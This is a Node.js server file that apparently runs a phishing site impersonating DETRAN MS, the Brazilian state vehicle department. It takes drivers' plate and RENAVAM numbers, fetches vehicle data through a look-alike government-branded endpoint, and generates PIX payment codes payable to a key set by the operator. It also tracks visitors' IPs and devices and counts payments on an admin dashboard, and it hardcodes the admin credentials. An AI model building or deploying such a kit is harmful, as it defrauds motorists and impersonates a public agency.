const express = require('express');
const axios = require('axios');
const cors = require('cors');
const fs = require('fs').promises;
const path = require('path');

const app = express();
app.use(express.json());

// ============================================
// CORS CONFIGURADO PARA PRODUÇÃO
// ============================================
const corsOptions = {
    origin: '*',
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization', 'Accept'],
    credentials: true,
    optionsSuccessStatus: 200
};

app.use(cors(corsOptions));
app.options('*', cors(corsOptions));

// Forçar HTTPS no Render
app.use((req, res, next) => {
    if (req.headers['x-forwarded-proto'] && 
        req.headers['x-forwarded-proto'] !== 'https' &&
        process.env.NODE_ENV === 'production') {
        return res.redirect(`https://${req.headers.host}${req.url}`);
    }
    next();
});

app.use(express.static('.'));

// ============================================
// BANCO DE DADOS SIMPLES EM JSON
// ============================================
const DATA_DIR = path.join(__dirname, 'data');

(async () => {
    try {
        await fs.mkdir(DATA_DIR, { recursive: true });
        const files = ['consultas.json', 'pix.json', 'config.json'];
        for (const file of files) {
            const filePath = path.join(DATA_DIR, file);
            try { 
                await fs.access(filePath); 
            } catch { 
                if (file === 'config.json') {
                    await fs.writeFile(filePath, JSON.stringify({
                        chavePix: '',
                        nomeRecebedor: 'DETRAN MS',
                        cidadeRecebedor: 'CAMPO GRANDE',
                        timerPagamento: 900,
                        pixTipo: 'aleatoria',
                        pixIdentificador: 'PAGAMENTODETRAN'
                    }, null, 2));
                } else {
                    await fs.writeFile(filePath, '[]');
                }
            }
        }
        console.log('✅ Sistema DETRAN MS inicializado');
    } catch (error) {
        console.error('❌ Erro na inicialização:', error);
    }
})();

// Funções para ler/escrever dados
async function readData(filename) {
    try {
        const data = await fs.readFile(path.join(DATA_DIR, filename), 'utf8');
        return JSON.parse(data);
    } catch (error) {
        return filename === 'config.json' ? {} : [];
    }
}

async function writeData(filename, data) {
    await fs.writeFile(path.join(DATA_DIR, filename), JSON.stringify(data, null, 2));
}

// ============================================
// USUÁRIOS ONLINE (TEMPO REAL - MEMÓRIA)
// ============================================
const usuariosOnline = new Map();

app.post('/api/online/entrou', (req, res) => {
    try {
        const ip = req.ip.replace('::ffff:', '') || req.connection.remoteAddress;
        const userAgent = req.get('User-Agent') || '';
        
        let dispositivo = 'Desktop';
        if (/android/i.test(userAgent)) dispositivo = 'Android';
        else if (/iphone|ipad|ipod/i.test(userAgent)) dispositivo = 'iOS';
        else if (/mobile/i.test(userAgent)) dispositivo = 'Mobile';
        
        usuariosOnline.set(ip, {
            ip,
            dispositivo,
            userAgent,
            paginaAtual: req.body.pagina || '/',
            ultimaAtividade: Date.now(),
            dataEntrada: new Date().toISOString()
        });
        
        console.log(`👤 Usuário ONLINE: ${ip} (${dispositivo})`);
        res.json({ sucesso: true, online: usuariosOnline.size });
    } catch (error) {
        res.status(500).json({ sucesso: false });
    }
});

app.post('/api/online/ativo', (req, res) => {
    try {
        const ip = req.ip.replace('::ffff:', '') || req.connection.remoteAddress;
        const usuario = usuariosOnline.get(ip);
        if (usuario) {
            usuario.ultimaAtividade = Date.now();
        }
        res.json({ sucesso: true });
    } catch (error) {
        res.status(500).json({ sucesso: false });
    }
});

app.post('/api/online/saiu', (req, res) => {
    try {
        const ip = req.ip.replace('::ffff:', '') || req.connection.remoteAddress;
        if (usuariosOnline.has(ip)) {
            usuariosOnline.delete(ip);
            console.log(`👤 Usuário OFFLINE: ${ip}`);
        }
        res.json({ sucesso: true, online: usuariosOnline.size });
    } catch (error) {
        res.status(500).json({ sucesso: false });
    }
});

// ============================================
// LOG DE REQUISIÇÕES
// ============================================
app.use((req, res, next) => {
    console.log(`${new Date().toISOString()} - ${req.method} ${req.url} - Origin: ${req.headers.origin || 'N/A'} - IP: ${req.ip}`);
    next();
});

// ============================================
// ROTA PRINCIPAL: CONSULTA DETRAN
// ============================================
app.post('/consultar', async (req, res) => {
    try {
        const { placa, renavam } = req.body;
        const ip = req.ip.replace('::ffff:', '') || req.connection.remoteAddress;
        const userAgent = req.get('User-Agent') || '';
        
        console.log(`🔍 Consulta recebida: ${placa} / ${renavam} - IP: ${ip}`);
        
        // TOKEN ORIGINAL
        const token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZW5hdmFtIjoiMDA0Njc4ODA0NzYiLCJwbGF0ZSI6Ik5SUzVKNDciLCJpYXQiOjE3NzAzMzIwMzR9.QmpzZTRGYiTxapKcyIzd8eZxooEGtQM3sAsMevX125c';

        // CONSULTA ORIGINAL (etapa 1)
        const resposta1 = await axios.post(
            'https://detranmatogrossosul-govbr.vercel.app/api/scrape5',
            { renavam, plate: placa },
            { headers: { Authorization: token } }
        );

        const userId = resposta1.data.userId;

        // CONSULTA ORIGINAL (etapa 2)
        const resposta2 = await axios.get(
            `https://detranmatogrossosul-govbr.vercel.app/veiculo/${userId}`
        );

        // REGISTRA CONSULTA
        const consultas = await readData('consultas.json');
        
        let dispositivo = 'Desktop';
        if (/android/i.test(userAgent)) dispositivo = 'Android';
        else if (/iphone|ipad|ipod/i.test(userAgent)) dispositivo = 'iOS';
        else if (/mobile/i.test(userAgent)) dispositivo = 'Mobile';
        
        consultas.push({
            placa: placa.toUpperCase(),
            renavam: renavam,
            ip: ip,
            dispositivo: dispositivo,
            dataHora: new Date().toISOString(),
            userId: userId
        });
        
        // Mantém apenas últimas 1000
        if (consultas.length > 1000) {
            consultas.splice(0, consultas.length - 1000);
        }
        await writeData('consultas.json', consultas);
        
        // Atualiza usuário online
        const usuario = usuariosOnline.get(ip);
        if (usuario) {
            usuario.ultimaAtividade = Date.now();
            usuario.paginaAtual = 'consultando';
        }
        
        // RETORNA HTML ORIGINAL DO DETRAN
        res.send(resposta2.data);

    } catch (error) {
        console.error('❌ Erro na consulta:', error.message);
        res.status(500).send('Erro: ' + error.message);
    }
});

// ============================================
// CONFIGURAÇÃO DE USUÁRIOS ADMIN - APENAS 1 USUÁRIO
// ============================================
const users = [
    {
        usuario: "dg",
        senha: "vasco1898",
        nivel: "admin",
        nome: "Administrador DG"
    }
];

// ============================================
// MIDDLEWARE DE AUTENTICAÇÃO
// ============================================
function autenticarAdmin(req, res, next) {
    const token = req.headers.authorization;
    
    if (!token || token !== 'DETRAN-MS-ADMIN-TOKEN') {
        return res.status(401).json({ 
            sucesso: false, 
            mensagem: 'Não autorizado' 
        });
    }
    next();
}

// ============================================
// API DE LOGIN ADMIN
// ============================================
app.post('/api/admin/login', (req, res) => {
    try {
        const { usuario, senha } = req.body;
        
        const user = users.find(u => 
            u.usuario === usuario && u.senha === senha
        );
        
        if (user) {
            res.json({
                sucesso: true,
                token: 'DETRAN-MS-ADMIN-TOKEN',
                usuario: user.usuario,
                nome: user.nome,
                nivel: user.nivel
            });
        } else {
            res.status(401).json({
                sucesso: false,
                mensagem: 'Usuário ou senha incorretos'
            });
        }
    } catch (error) {
        res.status(500).json({ 
            sucesso: false, 
            mensagem: 'Erro no servidor' 
        });
    }
});

// ============================================
// REGISTRAR PIX COPIADO (CORRIGIDO)
// ============================================
app.post('/api/registrar-pix-copiado', async (req, res) => {
    try {
        const { valor, placa, renavam, tipo, descricao } = req.body;
        const ip = req.ip.replace('::ffff:', '') || req.connection.remoteAddress;
        
        // Carrega dados PIX atual
        const pixData = await readData('pix.json');
        
        // Adiciona novo registro
        pixData.push({
            tipo: 'copiado',
            valor: parseFloat(valor) || 0,
            placa: placa || 'N/A',
            renavam: renavam || 'N/A',
            descricao: descricao || 'Código copiado',
            dataHora: new Date().toISOString(),
            ip: ip,
            status: 'copiado'
        });
        
        // Salva no arquivo
        await writeData('pix.json', pixData);
        
        console.log(`📋 PIX COPIADO registrado: ${placa} - R$ ${valor}`);
        
        res.json({ sucesso: true, mensagem: 'Registrado com sucesso' });
        
    } catch (error) {
        console.error('❌ Erro ao registrar PIX copiado:', error);
        res.status(500).json({ sucesso: false, erro: error.message });
    }
});

// ============================================
// API BUSCAR CONSULTAS
// ============================================
app.post('/api/admin/buscar-consultas', autenticarAdmin, async (req, res) => {
    try {
        const { filtro, tipo, pagina = 1, limite = 20 } = req.body;
        const consultas = await readData('consultas.json');
        
        let resultados = [...consultas].reverse(); // Mais recentes primeiro
        
        // Aplicar filtros
        if (filtro) {
            const filtroLower = filtro.toLowerCase();
            resultados = resultados.filter(c =>
                (c.placa && c.placa.toLowerCase().includes(filtroLower)) ||
                (c.renavam && c.renavam.includes(filtro)) ||
                (c.ip && c.ip.includes(filtro))
            );
        }
        
        if (tipo && tipo !== 'todos') {
            resultados = resultados.filter(c => 
                c.dispositivo && c.dispositivo.toLowerCase().includes(tipo.toLowerCase())
            );
        }
        
        // Paginação
        const inicio = (pagina - 1) * limite;
        const fim = inicio + limite;
        const paginados = resultados.slice(inicio, fim);
        const total = resultados.length;
        const totalPaginas = Math.ceil(total / limite);
        
        res.json({
            sucesso: true,
            pagina: parseInt(pagina),
            totalPaginas: totalPaginas,
            total: total,
            resultados: paginados
        });
        
    } catch (error) {
        console.error('Erro ao buscar consultas:', error);
        res.status(500).json({ sucesso: false, erro: error.message });
    }
});

// ============================================
// API BUSCAR PIX
// ============================================
app.post('/api/admin/buscar-pix', autenticarAdmin, async (req, res) => {
    try {
        const { filtro, tipo, pagina = 1, limite = 20 } = req.body;
        const pixData = await readData('pix.json');
        
        let resultados = [...pixData].reverse(); // Mais recentes primeiro
        
        // Aplicar filtros
        if (filtro) {
            const filtroLower = filtro.toLowerCase();
            resultados = resultados.filter(p =>
                (p.placa && p.placa.toLowerCase().includes(filtroLower)) ||
                (p.renavam && p.renavam.includes(filtro)) ||
                (p.valor && p.valor.toString().includes(filtro))
            );
        }
        
        if (tipo && tipo !== 'todos') {
            resultados = resultados.filter(p => p.tipo === tipo);
        }
        
        // Paginação
        const inicio = (pagina - 1) * limite;
        const fim = inicio + limite;
        const paginados = resultados.slice(inicio, fim);
        const total = resultados.length;
        const totalPaginas = Math.ceil(total / limite);
        
        res.json({
            sucesso: true,
            pagina: parseInt(pagina),
            totalPaginas: totalPaginas,
            total: total,
            resultados: paginados
        });
        
    } catch (error) {
        console.error('Erro ao buscar PIX:', error);
        res.status(500).json({ sucesso: false, erro: error.message });
    }
});

// ============================================
// CALCULAR CRC16 PARA PIX (CORRIGIDO)
// ============================================
function calcularCRC16(payload) {
    let crc = 0xFFFF;
    
    for (let i = 0; i < payload.length; i++) {
        crc ^= payload.charCodeAt(i) << 8;
        
        for (let j = 0; j < 8; j++) {
            if (crc & 0x8000) {
                crc = (crc << 1) ^ 0x1021;
            } else {
                crc = crc << 1;
            }
        }
    }
    
    // Mantém apenas 16 bits
    crc = crc & 0xFFFF;
    
    // Retorna em maiúsculas com 4 dígitos
    return crc.toString(16).toUpperCase().padStart(4, '0');
}

// ============================================
// GERAR CÓDIGO PIX REAL (IDÊNTICO AO gerarpix.com.br)
// ============================================
function gerarCodigoPIX(chavePix, valor, nomeRecebedor, cidade, identificador) {
    // VALIDAÇÕES BÁSICAS
    if (!chavePix || chavePix.trim() === '') {
        throw new Error('Chave PIX não configurada');
    }
    
    // Mantém chave EXATAMENTE como o usuário digitou (com pontos/traços)
    const chaveOriginal = chavePix.trim();
    
    // Validações básicas
    if (chaveOriginal.length < 11) {
        throw new Error('Chave PIX muito curta (mínimo 11 caracteres)');
    }
    
    if (chaveOriginal.length > 77) {
        throw new Error('Chave PIX muito longa (máximo 77 caracteres)');
    }
    
    // Preenche textos (igual gerarpix.com.br faz)
    nomeRecebedor = (nomeRecebedor || 'DETRAN MS').substring(0, 25);
    cidade = (cidade || 'CAMPO GRANDE').substring(0, 15);
    
    // TxId (identificador) - igual gerarpix.com.br
    const txId = (identificador || 'PAGAMENTODETRAN').substring(0, 20);
    
    // Valor com 2 casas decimais
    const valorStr = parseFloat(valor).toFixed(2);
    
    // ========================================
    // CONSTRUÇÃO IDÊNTICA AO gerarpix.com.br
    // ========================================
    
    // 1. Payload Format Indicator
    let payload = '000201';
    
    // 2. Merchant Account Information
    // Formato: 26 + tamanho + '0014BR.GOV.BCB.PIX' + '01' + tamanhoChave + chave
    const pixStatic = '0014BR.GOV.BCB.PIX';
    const chaveComTamanho = '01' + chaveOriginal.length.toString().padStart(2, '0') + chaveOriginal;
    const merchantInfo = pixStatic + chaveComTamanho;
    payload += '26' + merchantInfo.length.toString().padStart(2, '0') + merchantInfo;
    
    // 3. Merchant Category Code (0000 = Outros)
    payload += '52040000';
    
    // 4. Transaction Currency (BRL = 986)
    payload += '5303986';
    
    // 5. Transaction Amount
    payload += '54' + valorStr.length.toString().padStart(2, '0') + valorStr;
    
    // 6. Country Code
    payload += '5802BR';
    
    // 7. Merchant Name
    payload += '59' + nomeRecebedor.length.toString().padStart(2, '0') + nomeRecebedor;
    
    // 8. Merchant City
    payload += '60' + cidade.length.toString().padStart(2, '0') + cidade;
    
    // 9. Additional Data Field (TxId) - OPCIONAL mas o gerarpix.com.br inclui
    if (txId && txId.length > 0) {
        const additionalData = '05' + txId.length.toString().padStart(2, '0') + txId;
        payload += '62' + additionalData.length.toString().padStart(2, '0') + additionalData;
    }
    
    // Adiciona placeholder do CRC
    const payloadSemCRC = payload + '6304';
    
    // Calcula CRC16
    const crc = calcularCRC16(payloadSemCRC);
    
    // Retorna código completo
    return payload + '6304' + crc;
}

// ============================================
// VALIDAR PIX (TESTE RÁPIDO)
// ============================================
function testarGeracaoPIX() {
    try {
        // Teste com chave CPF (exemplo)
        const pixCode = gerarCodigoPIX(
            '068.542.791-94',  // CPF com pontos/traço
            100.00,
            'detran ms',
            'mato grosso',
            'pagamentodetran'
        );
        
        console.log('🧪 TESTE PIX GERADO:');
        console.log('Tamanho:', pixCode.length);
        console.log('CRC:', pixCode.slice(-4));
        console.log('Primeiros 50:', pixCode.substring(0, 50));
        
        return pixCode;
        
    } catch (error) {
        console.error('❌ Erro no teste PIX:', error.message);
        return null;
    }
}

// Executa teste ao iniciar
console.log('🧪 Testando geração de PIX...');
testarGeracaoPIX();

// ============================================
// API PARA GERAR PIX COM CHAVE DO PAINEL (ATUALIZADA)
// ============================================
app.post('/api/gerar-pix', async (req, res) => {
    try {
        const { valor, placa, renavam, tipo, descricao } = req.body;
        const ip = req.ip.replace('::ffff:', '') || req.connection.remoteAddress;
        
        // Carrega configurações COMPLETAS
        const config = await readData('config.json');
        
        // VERIFICA SE TEM CHAVE PIX CADASTRADA
        if (!config.chavePix || config.chavePix.trim() === '') {
            return res.status(400).json({ 
                sucesso: false, 
                mensagem: 'Configure sua chave PIX no painel administrativo' 
            });
        }
        
        // Valida valor
        const valorNum = parseFloat(valor);
        if (isNaN(valorNum) || valorNum <= 0 || valorNum > 1000000) {
            return res.status(400).json({ 
                sucesso: false, 
                mensagem: 'Valor inválido' 
            });
        }
        
        // Gera código PIX USANDO NOVA FUNÇÃO
        const codigoPix = gerarCodigoPIX(
            config.chavePix, 
            valorNum, 
            config.nomeRecebedor || 'DETRAN MS',
            config.cidadeRecebedor || 'CAMPO GRANDE',
            config.pixIdentificador || 'PAGAMENTODETRAN'
        );
        
        // DEBUG: Log do PIX gerado
        console.log('📱 PIX GERADO COM SUCESSO:', {
            tamanho: codigoPix.length,
            ultimos10: codigoPix.slice(-10),
            crc: codigoPix.slice(-4),
            placa: placa,
            valor: valorNum
        });
        
        // Registra PIX gerado
        const pixData = await readData('pix.json');
        pixData.push({
            tipo: tipo || 'gerado',
            valor: valorNum,
            placa: placa || 'N/A',
            renavam: renavam || 'N/A',
            descricao: descricao || '',
            chavePix: config.chavePix.substring(0, 3) + '***' + config.chavePix.substring(config.chavePix.length - 3),
            chaveTipo: config.pixTipo || 'aleatoria',
            identificador: config.pixIdentificador || 'PAGAMENTODETRAN',
            dataHora: new Date().toISOString(),
            ip: ip,
            status: 'pendente',
            codigoPix: codigoPix.substring(0, 80) // Mostra só início
        });
        
        await writeData('pix.json', pixData);
        
        res.json({
            sucesso: true,
            codigoPix: codigoPix,
            chavePix: config.chavePix.substring(0, 3) + '***',
            nomeRecebedor: config.nomeRecebedor,
            cidade: config.cidadeRecebedor,
            identificador: config.pixIdentificador,
            valor: valorNum.toFixed(2),
            timer: config.timerPagamento || 900,
            mensagem: 'PIX gerado com sucesso!'
        });
        
    } catch (error) {
        console.error('❌ Erro ao gerar PIX:', error.message);
        res.status(500).json({ 
            sucesso: false, 
            erro: error.message,
            mensagem: 'Erro na geração do código PIX. Verifique a chave configurada.'
        });
    }
});

// ============================================
// API LIMPAR DADOS
// ============================================
app.post('/api/admin/limpar-dados', autenticarAdmin, async (req, res) => {
    try {
        const { tipo } = req.body;
        
        if (tipo === 'consultas') {
            await writeData('consultas.json', []);
        } else if (tipo === 'pix') {
            await writeData('pix.json', []);
        } else if (tipo === 'tudo') {
            await writeData('consultas.json', []);
            await writeData('pix.json', []);
        }
        
        res.json({
            sucesso: true,
            mensagem: `Dados ${tipo} limpos com sucesso`
        });
        
    } catch (error) {
        console.error('Erro ao limpar dados:', error);
        res.status(500).json({ sucesso: false, erro: error.message });
    }
});

// ============================================
// API REMOVER USUÁRIO (MEMÓRIA)
// ============================================
app.post('/api/admin/remover-usuario', autenticarAdmin, (req, res) => {
    try {
        const { ip } = req.body;
        
        if (usuariosOnline.has(ip)) {
            usuariosOnline.delete(ip);
            res.json({
                sucesso: true,
                mensagem: `Usuário ${ip} removido`,
                online: usuariosOnline.size
            });
        } else {
            res.status(404).json({
                sucesso: false,
                mensagem: 'Usuário não encontrado'
            });
        }
        
    } catch (error) {
        res.status(500).json({ sucesso: false, erro: error.message });
    }
});

// ============================================
// API EXPORTAR DADOS
// ============================================
app.get('/api/admin/exportar/:tipo', autenticarAdmin, async (req, res) => {
    try {
        const { tipo } = req.params;
        
        if (tipo === 'consultas') {
            const consultas = await readData('consultas.json');
            res.setHeader('Content-Type', 'application/json');
            res.setHeader('Content-Disposition', 'attachment; filename=consultas_detran_ms.json');
            res.json(consultas);
        } else if (tipo === 'pix') {
            const pix = await readData('pix.json');
            res.setHeader('Content-Type', 'application/json');
            res.setHeader('Content-Disposition', 'attachment; filename=pix_detran_ms.json');
            res.json(pix);
        } else {
            res.status(400).json({ sucesso: false, mensagem: 'Tipo inválido' });
        }
        
    } catch (error) {
        res.status(500).json({ sucesso: false, erro: error.message });
    }
});

// ============================================
// API PARA PAINEL ADMIN DASHBOARD
// ============================================
app.get('/api/admin/dashboard', autenticarAdmin, async (req, res) => {
    try {
        const consultas = await readData('consultas.json');
        const pix = await readData('pix.json');
        const config = await readData('config.json');
        
        // Usuários online (últimos 30 minutos)
        const agora = Date.now();
        const usuariosAtivos = [];
        
        usuariosOnline.forEach((usuario, ip) => {
            const segundosInativo = Math.floor((agora - usuario.ultimaAtividade) / 1000);
            if (segundosInativo <= 1800) { // 30 minutos
                usuariosAtivos.push({
                    ...usuario,
                    segundosInativo,
                    status: segundosInativo > 300 ? 'inativo' : 'ativo' // 5 minutos
                });
            }
        });
        
        // Ordena por atividade
        usuariosAtivos.sort((a, b) => a.segundosInativo - b.segundosInativo);
        
        // Calcula estatísticas PIX
        const pixGerados = pix.filter(p => p.tipo === 'gerado' || p.tipo === 'real');
        const pixCopiados = pix.filter(p => p.tipo === 'copiado');
        const pixReais = pix.filter(p => p.tipo === 'real');
        
        // Calcula valores
        const calcularTotal = (lista) => {
            return lista.reduce((total, item) => {
                const valor = parseFloat(item.valor) || 0;
                return total + valor;
            }, 0);
        };
        
        const valorGerados = calcularTotal(pixGerados);
        const valorCopiados = calcularTotal(pixCopiados);
        const valorReais = calcularTotal(pixReais);
        const valorTotal = valorGerados + valorCopiados;
        
        // Consultas hoje
        const hoje = new Date().toDateString();
        const consultasHoje = consultas.filter(c => 
            new Date(c.dataHora).toDateString() === hoje
        ).length;
        
        // PIX hoje
        const pixHoje = pix.filter(p => 
            new Date(p.dataHora).toDateString() === hoje
        ).length;
        
        // Atividade por hora (últimas 24h)
        const atividadePorHora = {};
        const agora24h = new Date(agora - 24 * 60 * 60 * 1000);
        
        pix.forEach(p => {
            const hora = new Date(p.dataHora).getHours();
            if (new Date(p.dataHora) >= agora24h) {
                atividadePorHora[hora] = (atividadePorHora[hora] || 0) + 1;
            }
        });
        
        // Preenche horas sem atividade
        for (let i = 0; i < 24; i++) {
            if (!atividadePorHora[i]) {
                atividadePorHora[i] = 0;
            }
        }
        
        res.json({
            sucesso: true,
            dados: {
                estatisticas: {
                    usuariosOnline: usuariosAtivos.length,
                    totalConsultas: consultas.length,
                    consultasHoje: consultasHoje,
                    pixGerados: pixGerados.length,
                    pixCopiados: pixCopiados.length,
                    pixReais: pixReais.length,
                    pixHoje: pixHoje,
                    valorGerados: `R$ ${valorGerados.toFixed(2)}`,
                    valorCopiados: `R$ ${valorCopiados.toFixed(2)}`,
                    valorReais: `R$ ${valorReais.toFixed(2)}`,
                    valorTotal: `R$ ${valorTotal.toFixed(2)}`
                },
                consultasCompletas: consultas.slice(-50).reverse(), // Últimas 50
                pixCompletos: pix.slice(-50).reverse(), // Últimas 50
                usuariosOnline: usuariosAtivos,
                atividadePorHora: atividadePorHora,
                sistema: {
                    versao: '2.5.0',
                    inicioOperacao: new Date().toLocaleDateString('pt-BR'),
                    chavePix: config.chavePix || 'Não configurada',
                    chaveTipo: config.pixTipo || 'aleatoria',
                    nomeRecebedor: config.nomeRecebedor || 'DETRAN MS',
                    cidadeRecebedor: config.cidadeRecebedor || 'CAMPO GRANDE',
                    identificador: config.pixIdentificador || 'PAGAMENTODETRAN',
                    timerPagamento: config.timerPagamento || 900,
                    memoria: `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB`
                }
            }
        });
        
    } catch (error) {
        res.status(500).json({ sucesso: false, erro: error.message });
    }
});

// ============================================
// API PARA CONFIGURAÇÕES (PAINEL)
// ============================================
app.post('/api/admin/config', autenticarAdmin, async (req, res) => {
    try {
        const { 
            chavePix, 
            nomeRecebedor, 
            cidadeRecebedor, 
            timerPagamento, 
            autoCleanup,
            pixTipo,
            pixIdentificador
        } = req.body;
        
        // Valida chave PIX
        if (chavePix !== undefined && (!chavePix || chavePix.trim() === '')) {
            return res.status(400).json({ 
                sucesso: false, 
                mensagem: 'Chave PIX é obrigatória' 
            });
        }
        
        const config = await readData('config.json');
        
        const novaConfig = {
            chavePix: chavePix !== undefined ? chavePix.trim() : config.chavePix,
            nomeRecebedor: nomeRecebedor || config.nomeRecebedor || 'DETRAN MS',
            cidadeRecebedor: cidadeRecebedor || config.cidadeRecebedor || 'CAMPO GRANDE',
            timerPagamento: timerPagamento || config.timerPagamento || 900,
            autoCleanup: autoCleanup !== undefined ? parseInt(autoCleanup) : config.autoCleanup || 30,
            pixTipo: pixTipo || config.pixTipo || 'aleatoria',
            pixIdentificador: pixIdentificador || config.pixIdentificador || 'PAGAMENTODETRAN',
            atualizado: new Date().toISOString()
        };
        
        await writeData('config.json', novaConfig);
        
        console.log('✅ Configurações atualizadas');
        
        res.json({ 
            sucesso: true, 
            mensagem: 'Configurações salvas com sucesso',
            config: novaConfig
        });
        
    } catch (error) {
        res.status(500).json({ sucesso: false, erro: error.message });
    }
});

// ============================================
// TESTE RÁPIDO DE PIX
// ============================================
app.post('/api/testar-pix', async (req, res) => {
    try {
        const { chavePix } = req.body;
        
        if (!chavePix) {
            return res.status(400).json({ 
                sucesso: false, 
                mensagem: 'Forneça uma chave PIX para testar' 
            });
        }
        
        // Gera PIX de teste
        const codigoPix = gerarCodigoPIX(
            chavePix, 
            1.00,
            'DETRAN MS TESTE',
            'CAMPO GRANDE',
            'TESTEPIX'
        );
        
        res.json({
            sucesso: true,
            codigoPix: codigoPix,
            tamanho: codigoPix.length,
            crc: codigoPix.slice(-4),
            mensagem: 'PIX gerado com sucesso! Teste em um app bancário.'
        });
        
    } catch (error) {
        res.status(500).json({ 
            sucesso: false, 
            erro: error.message,
            mensagem: 'Erro ao gerar PIX de teste'
        });
    }
});

// ============================================
// LIMPEZA AUTOMÁTICA DE INATIVOS - 30 MINUTOS
// ============================================
setInterval(() => {
    const agora = Date.now();
    let removidos = 0;
    
    usuariosOnline.forEach((usuario, ip) => {
        const segundosInativo = Math.floor((agora - usuario.ultimaAtividade) / 1000);
        if (segundosInativo > 1800) { // 30 MINUTOS
            usuariosOnline.delete(ip);
            removidos++;
        }
    });
    
    if (removidos > 0) {
        console.log(`🧹 Limpou ${removidos} usuários inativos (30+ minutos)`);
    }
}, 60000); // Verifica a cada 1 minuto

// ============================================
// LIMPEZA AUTOMÁTICA DE DADOS ANTIGOS
// ============================================
setInterval(async () => {
    try {
        const config = await readData('config.json');
        const diasParaManter = config.autoCleanup || 30;
        
        if (diasParaManter > 0) {
            const limiteData = new Date();
            limiteData.setDate(limiteData.getDate() - diasParaManter);
            
            // Limpa consultas antigas
            const consultas = await readData('consultas.json');
            const consultasAtualizadas = consultas.filter(c => {
                const dataConsulta = new Date(c.dataHora);
                return dataConsulta >= limiteData;
            });
            
            if (consultasAtualizadas.length < consultas.length) {
                await writeData('consultas.json', consultasAtualizadas);
                console.log(`🧹 Limpou ${consultas.length - consultasAtualizadas.length} consultas antigas (> ${diasParaManter} dias)`);
            }
            
            // Limpa PIX antigos
            const pix = await readData('pix.json');
            const pixAtualizados = pix.filter(p => {
                const dataPix = new Date(p.dataHora);
                return dataPix >= limiteData;
            });
            
            if (pixAtualizados.length < pix.length) {
                await writeData('pix.json', pixAtualizados);
                console.log(`🧹 Limpou ${pix.length - pixAtualizados.length} PIX antigos (> ${diasParaManter} dias)`);
            }
        }
    } catch (error) {
        console.error('Erro na limpeza automática:', error);
    }
}, 3600000); // A cada 1 hora

// ============================================
// INICIA O SERVIDOR
// ============================================
const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log('============================================');
    console.log('✅ Servidor DETRAN MS rodando na porta: ' + PORT);
    console.log('🌐 Acesse via: https://gov-detranms.onrender.com');
    console.log('👨‍💼 Painel Admin: /painel.html');
    console.log('📊 Dados salvos em: /data/');
    console.log('⏰ Timer PIX: 15 minutos');
    console.log('🔧 Token DETRAN: PRESERVADO');
    console.log('🔐 Usuário admin: dg / vasco1898');
    console.log('⏱️  Tempo de sessão: 30 minutos');
    console.log('💳 PIX: Funciona igual gerarpix.com.br');
    console.log('📱 Sistema PRONTO para uso em qualquer dispositivo!');
    console.log('============================================');
});
